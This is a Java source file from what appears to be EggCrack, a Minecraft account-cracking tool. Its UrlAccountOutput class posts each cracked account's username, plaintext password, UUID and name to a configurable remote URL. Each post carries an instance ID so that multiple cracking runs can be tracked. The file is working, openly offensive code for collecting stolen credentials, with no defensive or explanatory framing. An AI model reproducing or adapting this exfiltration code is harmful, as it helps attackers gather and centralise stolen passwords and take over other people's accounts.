package net.teamlixo.eggcrack.account.output;

import net.teamlixo.eggcrack.EggCrack;
import net.teamlixo.eggcrack.account.Account;
import net.teamlixo.eggcrack.account.AuthenticatedAccount;
import net.teamlixo.eggcrack.credential.Credential;

import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.UUID;

public class UrlAccountOutput extends AccountOutput {
    /**
     * Generate a random UUID for this instance of the program. Can be used to track
     * multiple instances at once.
     */
    private static final UUID INSTANCE_UUID = UUID.randomUUID();

    private static final String CHARSET = "UTF-8";

    private final URL url;

    public UrlAccountOutput(URL url) {
        this.url = url;
    }

    @Override
    public void save(AuthenticatedAccount account) throws IOException {
        String query = String.format(
                "username=%s&password=%s&uuid=%s&name=%s&instance=%s&version=%s",

                URLEncoder.encode(account.getUsername(), CHARSET),
                URLEncoder.encode(account.getCredential().toString(), CHARSET),
                URLEncoder.encode(account.getUuid().toString(), CHARSET),
                URLEncoder.encode(account.getAccountName().toString(), CHARSET),

                URLEncoder.encode(INSTANCE_UUID.toString(), CHARSET),
                URLEncoder.encode(Integer.toString(EggCrack.getInstance().getVersion()), CHARSET)
        );

        synchronized (url) {
            HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
            urlConnection.setConnectTimeout(10000);
            urlConnection.setReadTimeout(10000);

            urlConnection.setRequestMethod("POST");
            urlConnection.setRequestProperty("Accept-Charset", CHARSET);
            urlConnection.setRequestProperty("User-Agent", "EggCrack");
            urlConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded;charset=" + CHARSET);

            urlConnection.setDoOutput(true);
            urlConnection.setUseCaches(false);
            urlConnection.setInstanceFollowRedirects(false);

            OutputStream outputStream = urlConnection.getOutputStream();
            outputStream.write(query.getBytes(CHARSET));
            outputStream.flush();

            if (urlConnection.getResponseCode() / 100 != 2)
                throw new IOException("Request failed (HTTP " + urlConnection.getResponseCode() + "): "
                        + urlConnection.getResponseMessage());

            EggCrack.LOGGER.fine("Account " + account.getUsername()
                    + " submitted to URL \"" + url.toExternalForm() + "\".");

            //Safely close the connection.
            urlConnection.getInputStream().close();
        }
    }
}
